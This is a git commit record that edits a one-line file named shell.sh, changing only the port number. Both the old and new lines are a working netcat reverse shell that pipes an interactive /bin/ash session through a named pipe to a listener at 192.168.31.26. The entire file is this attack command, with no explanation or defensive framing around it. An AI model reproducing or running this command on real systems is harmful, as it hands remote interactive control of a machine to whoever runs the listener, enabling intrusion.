940fa16443dc4f5c3ab4681292fa4317c25b8347
cc-crack <pk8995z@gmail.com>
2018-07-12 11:25:23 +0800

    Update shell.sh

--- shell.sh
+++ shell.sh
@@ -1,1 +1,1 @@
-rm /tmp/f1 ; mkfifo /tmp/f1;cat /tmp/f1 | /bin/ash -i 2>&1 | nc 192.168.31.26 4444 > /tmp/f1
+rm /tmp/f1 ; mkfifo /tmp/f1;cat /tmp/f1 | /bin/ash -i 2>&1 | nc 192.168.31.26 5555 > /tmp/f1
